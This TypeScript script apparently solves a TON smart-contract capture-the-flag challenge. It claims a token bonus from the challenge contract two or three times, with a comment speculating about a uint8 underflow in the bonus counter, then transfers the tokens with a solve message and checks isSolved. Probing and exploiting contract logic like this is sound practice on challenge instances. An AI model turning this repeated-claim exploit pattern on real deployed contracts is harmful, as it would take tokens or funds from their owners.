import { TonClient, WalletContractV3R2 } from '@ton/ton';
import { keyPairFromSeed } from '@ton/crypto';
import { Address, toNano, beginCell, SendMode, TupleItem, internal } from '@ton/core';
import * as fs from 'fs';

const SESSION_FILE = 'session.json';
interface SessionData { uuid: string; challenge: string; api: string; wallet_id: number; seed: string; }

function sleep(ms: number) { return new Promise(r => setTimeout(r, ms)); }

async function getJettonBal(client: TonClient, addr: Address): Promise<bigint | null> {
    try { const r = await client.runMethod(addr, 'get_wallet_data'); return r.stack.readBigNumber(); } catch { return null; }
}

async function getMinterData(client: TonClient, minter: Address): Promise<{totalSupply: bigint, adminAddress: Address} | null> {
    try {
        const r = await client.runMethod(minter, 'get_jetton_data');
        const totalSupply = r.stack.readBigNumber();
        const mintable = r.stack.readBoolean();
        const adminAddress = r.stack.readAddress();
        return { totalSupply, adminAddress };
    } catch (e: any) {
        console.log(`  getMinterData error: ${e.message.slice(0, 100)}`);
        return null;
    }
}

async function main() {
    const s: SessionData = JSON.parse(fs.readFileSync(SESSION_FILE, 'utf-8'));
    console.log(`UUID: ${s.uuid}\nChallenge: ${s.challenge}`);

    const api = s.api.replace(/\/+$/, '') + '/jsonRPC';
    const client = new TonClient({ endpoint: api, timeout: 30000 });
    const challengeAddr = Address.parse(s.challenge);
    const seed = Buffer.from(s.seed, 'hex');
    const kp = keyPairFromSeed(seed);
    const wallet = WalletContractV3R2.create({ workchain: -1, publicKey: kp.publicKey, walletId: s.wallet_id });
    const openedWallet = client.open(wallet);
    const provider = client.provider(wallet.address, wallet.init);
    console.log(`Wallet: ${wallet.address}\n`);

    // Get minter + jetton addrs
    const mr = await client.runMethod(challengeAddr, 'minter');
    const minter = mr.stack.readAddress();
    console.log(`Minter: ${minter}`);
    const pwc = beginCell().storeAddress(wallet.address).endCell();
    const pwr = await client.runMethod(minter, 'get_wallet_address', [{ type: 'slice', cell: pwc } as TupleItem]);
    const pJetton = pwr.stack.readAddress();
    console.log(`Player jetton: ${pJetton}`);
    const cwc = beginCell().storeAddress(challengeAddr).endCell();
    const cwr = await client.runMethod(minter, 'get_wallet_address', [{ type: 'slice', cell: cwc } as TupleItem]);
    const cJetton = cwr.stack.readAddress();
    console.log(`Challenge jetton: ${cJetton}`);

    // Debug: check minter admin address vs challenge address
    const minterData = await getMinterData(client, minter);
    if (minterData) {
        console.log(`Minter admin: ${minterData.adminAddress}`);
        console.log(`Challenge addr: ${challengeAddr}`);
        console.log(`Admin == Challenge? ${minterData.adminAddress.toString()} === ${challengeAddr.toString()}`);
    }
    console.log();

    // Initial state
    let tonBal = await client.getBalance(wallet.address);
    let jetBal = await getJettonBal(client, pJetton);
    console.log(`Initial: TON=${Number(tonBal)/1e9} Jetton=${jetBal}`);

    // === Phase 1: Claim bonus #1 ===
    console.log(`\n=== Bonus #1 ===`);
    const bonusBody = beginCell().storeUint(0x13370002, 32).storeUint(0, 64).endCell();

    let seqno = await wallet.getSeqno(provider);
    console.log(`  seqno=${seqno}, TON=${Number(tonBal)/1e9}`);
    await openedWallet.sendTransfer({
        seqno, secretKey: kp.secretKey,
        messages: [internal({ to: challengeAddr, value: toNano('0.15'), body: bonusBody, bounce: false })],
        sendMode: SendMode.PAY_GAS_SEPARATELY,
    });
    for (let w = 0; w < 30; w++) { await sleep(2000); const ns = await wallet.getSeqno(provider); if (ns > seqno) { console.log(`  seqno→${ns}`); break; } }
    await sleep(5000);
    tonBal = await client.getBalance(wallet.address); jetBal = await getJettonBal(client, pJetton);
    console.log(`  TON=${Number(tonBal)/1e9} Jetton=${jetBal}`);

    // Debug after bonus #1
    const md1 = await getMinterData(client, minter);
    if (md1) console.log(`  Supply=${md1.totalSupply} Admin=${md1.adminAddress}`);

    // === Phase 2: Claim bonus #2 ===
    console.log(`\n=== Bonus #2 ===`);
    seqno = await wallet.getSeqno(provider);
    console.log(`  seqno=${seqno}, TON=${Number(tonBal)/1e9}`);
    await openedWallet.sendTransfer({
        seqno, secretKey: kp.secretKey,
        messages: [internal({ to: challengeAddr, value: toNano('0.15'), body: bonusBody, bounce: false })],
        sendMode: SendMode.PAY_GAS_SEPARATELY,
    });
    for (let w = 0; w < 30; w++) { await sleep(2000); const ns = await wallet.getSeqno(provider); if (ns > seqno) { console.log(`  seqno→${ns}`); break; } }
    await sleep(10000); // extra settle time
    tonBal = await client.getBalance(wallet.address); jetBal = await getJettonBal(client, pJetton);
    console.log(`  TON=${Number(tonBal)/1e9} Jetton=${jetBal}`);

    // Debug after bonus #2
    const md2 = await getMinterData(client, minter);
    if (md2) console.log(`  Supply=${md2.totalSupply} Admin=${md2.adminAddress}`);

    // If jetton still 50, try ONE MORE bonus (maybe uint8 underflow wrap?)
    if (jetBal === null || jetBal < 100n) {
        console.log(`\n=== Bonus #3 (maybe remainingPlayerBonus wrapped?) ===`);
        seqno = await wallet.getSeqno(provider);
        console.log(`  seqno=${seqno}, TON=${Number(tonBal)/1e9}`);
        await openedWallet.sendTransfer({
            seqno, secretKey: kp.secretKey,
            messages: [internal({ to: challengeAddr, value: toNano('0.15'), body: bonusBody, bounce: false })],
            sendMode: SendMode.PAY_GAS_SEPARATELY,
        });
        for (let w = 0; w < 30; w++) { await sleep(2000); const ns = await wallet.getSeqno(provider); if (ns > seqno) { console.log(`  seqno→${ns}`); break; } }
        await sleep(5000);
        tonBal = await client.getBalance(wallet.address); jetBal = await getJettonBal(client, pJetton);
        console.log(`  TON=${Number(tonBal)/1e9} Jetton=${jetBal}`);
        const md3 = await getMinterData(client, minter);
        if (md3) console.log(`  Supply=${md3.totalSupply} Admin=${md3.adminAddress}`);
    }

    // === Phase 3: If have 100 jettons, transfer with Solve ===
    jetBal = await getJettonBal(client, pJetton);
    console.log(`\n=== Transfer ${jetBal ?? 0} jettons + Solve ===`);

    const amount = (jetBal ?? 0n);
    if (amount < 100n) { console.log(`Only ${amount} jettons, need 100.`); process.exit(1); }

    const xferBody = beginCell()
        .storeUint(0x0f8a7ea5, 32) .storeUint(0, 64)
        .storeCoins(amount) .storeAddress(cJetton) .storeAddress(null)
        .storeBit(0) .storeCoins(toNano('0.05'))
        .storeUint(0x13370005, 32) .storeUint(0, 64)
    .endCell();

    seqno = await wallet.getSeqno(provider);
    console.log(`  Seqno: ${seqno}, Wallet TON: ${Number(await client.getBalance(wallet.address))/1e9}`);
    await openedWallet.sendTransfer({
        seqno, secretKey: kp.secretKey,
        messages: [internal({ to: pJetton, value: toNano('0.2'), body: xferBody, bounce: false })],
        sendMode: SendMode.PAY_GAS_SEPARATELY,
    });
    for (let w = 0; w < 30; w++) { await sleep(2000); const ns = await wallet.getSeqno(provider); if (ns > seqno) { console.log(`  seqno→${ns}`); break; } }
    await sleep(10000);

    // Check isSolved
    console.log(`\n=== Check isSolved ===`);
    for (let i = 0; i < 12; i++) {
        try {
            const r = await client.runMethod(challengeAddr, 'isSolved');
            const solved = r.stack.readBoolean();
            console.log(`  Check ${i+1}: ${solved}`);
            if (solved) { console.log(`\n🎉 SOLVED! 🎉\nUUID: ${s.uuid}`); process.exit(0); }
        } catch (e: any) { console.log(`  Check ${i+1} error: ${e.message.slice(0, 80)}`); }
        await sleep(5000);
    }
    console.log(`Not solved.`);
}
main().catch(console.error);
